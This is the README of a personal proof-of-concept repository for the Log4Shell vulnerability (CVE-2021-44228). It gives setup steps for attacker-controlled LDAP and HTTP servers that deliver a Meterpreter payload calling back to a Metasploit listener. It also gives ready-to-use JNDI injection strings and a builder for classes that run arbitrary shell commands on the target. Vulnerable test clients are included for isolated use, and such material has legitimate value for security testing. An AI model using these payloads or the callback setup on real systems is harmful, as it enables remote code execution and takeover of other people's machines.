# l4s_poc
Log4Shell (Cve-2021-44228) Proof Of Concept

This is a personal project that runs a simple POC that will host an LDAP
server and an HTTP server for the Log4Shell exploit.  

## Server
The run_servers.py will setup a stripped down meterpreter client that will call
back to the Metasploit instance passed into the ldap request.  **This will run
the meterpreter instance in a thread in the original process that was affected
by the Log4Shell exploit.**

The LDAP server is written in Java and the HTTP server is hosted in python and
will serve from a newly created wwwroot directory.  This does require java,
javac and mvn to build the exploits, and host the LDAP server.  I used Java 8.

Python3 is also required.

#### to get started
run: python3 run_servers.py <your_ip_address> <the_http_port> [ldap_port]

Then pass the jndi string to a vulnerable client to log i.e:
if your host was 10.20.30.40 and your metasploit instance was 20.30.40.50 
listening on port 4444 it would look like this : 
'${jndi:ldap://10.20.30.40:1389/#MM:20.30.40.50:4444}'

#### Building executable commands
You can build classes that will launch executable on the source system.
You can have different commands for windows or linux based systems.
For instance to create a class called TestCmd that will launch a calculator
on Windows systems and Firefox on linux systems run :
**python3 build_cmd.py TestCmd -w "Calc.exe" -l "firefox"**

You can have multiple pre built classes.  If you do not specify a command 
for the target os then nothing is executed.  Note these commands are run 
as CMD \c "your command" on windows and /bin/sh -c "your command" on linux.

To trigger the above command use the name of the class you created i.e : 
'${jndi:ldap://10.20.30.40:1389/#TestCmd'

The Payload.java file is the full Meterpreter file that is setup to run as a
thread in the calling process that had the log4shell issue.  This needs to be 
manuallyy compiled and moved to the wwwroot dir.  Additionally you need to have
the metasploit.dat file setup with the properties you need.

## Clients
The clients directory has 2 clients that can be executed.  One is a simple command
line program that will write an error log for whatever the 1st param passed in is.

The other is a basic web server that will write an error log using the log_me
header information.  Note this should be run in an isolated controlled env.

#### To build the clients :
navigate to the clients dir and run  ./build_clients.sh

#### To execute the webserver : 
from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jWebServer [Port_number]

#### To execute the cmd line : 
from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}'



